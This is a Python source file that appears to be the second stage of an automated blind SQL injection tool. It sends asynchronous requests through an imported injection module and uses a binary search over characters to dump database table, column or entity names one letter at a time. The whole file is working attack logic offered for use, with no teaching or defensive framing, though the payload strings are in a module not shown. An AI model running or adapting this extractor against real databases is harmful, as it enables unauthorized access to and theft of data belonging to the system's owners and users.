import sys
import asyncio
import aiohttp
import string
import core.config as cfg
import core.injection as injection


async def extract_binary(session, data):
    chars = data['chars']
    left, right = 0, len(chars)
    while left <= right:
        mid = (left + right) // 2
        if await injection.inject_payload(session, {**data, "char": chars[mid], "operator": ">"}):
            left = mid + 1
        elif await injection.inject_payload(session, {**data, "char": chars[mid], "operator": "="}):
            return chars[mid]
        else:
            right = mid - 1
    return 0

async def main():
    chars = sorted(string.ascii_lowercase + string.digits)
    nums = [int(i) for i in range(500)]
    global general_name
    general_name = ""
    counter = 1
    letter_position = 1
    num, char = 0, 0
    #data = {
    #    "general_name": general_name,
    #    "counter": counter,
    #    "offset": cfg.usr_offset,
    #    "letter_position": letter_position,
    #    "operator": "=",
    #    "nums": nums,
    #    "chars": chars,
    #    "num": num,
    #    "char": char
    #}
    
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                data = {
                        "general_name": general_name,
                        "counter": counter,
                        "offset": cfg.usr_offset,
                        "letter_position": letter_position,
                        "operator": "=",
                        "nums": nums,
                        "chars": chars,
                        "num": num,
                        "char": char
                }
                if cfg.usr_mode == 'table' or cfg.usr_mode == 'column' or cfg.usr_mode == 'entity':
                    
                    #### quick check for special chars
                    tasks = [injection.inject_payload(session, {**data, "char": char}) for char in cfg.special_chars]
                    results = await asyncio.gather(*tasks)

                    for i, char  in enumerate(cfg.special_chars):
                        if results[i]:
                            print(results)
                            print(f"i = {i} | results = {results} | results[i] = {results[i]} | char = {char}")
                            break
                    else:
                        attack = await extract_binary(session, data)
                        if attack:
                            general_name += attack
                            letter_position += 1
                        else:
                            sys.stdout.write("\n")
                            print(f"[+] done. data dumped: {general_name}")
                            cfg.usr_offset += 1
                            letter_position = 1
                            general_name = ""

    
    #except KeyboardInterrupt:
        #print("[!] force exit stage 2")
        #print("\n[!] Player paused the game...\r")
        #usr_abort_question = input("\n[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
        #if usr_abort_question == 'c':
            #continue
        #if usr_abort_question == 'q':
        #    print("\n[x] Player left the game [x]")
        
    except Exception as e:
        print("[!] stage 2 error: ", e)
        sys.exit(1)

    return general_name, counter



if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            print("[!] force exit stage 2")
            print("\n[!] Player paused the game...\r")
            usr_abort_question = input("\n[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
            if usr_abort_question == 'e':
                sys.exit(1)
            elif usr_abort_question == 'q':
                print("\n[x] Player left the game [x]")
                sys.exit(1)
            elif usr_abort_question == 'c':
                print("continue...")
                continue
            #print("[!] force exit")
            #sys.exit(1)
        except Exception as e:
            print("[!] stage 1 error: ", e)
            sys.exit(1)
        finally:
            sys.exit(1)
else:
    sys.exit(1)
        
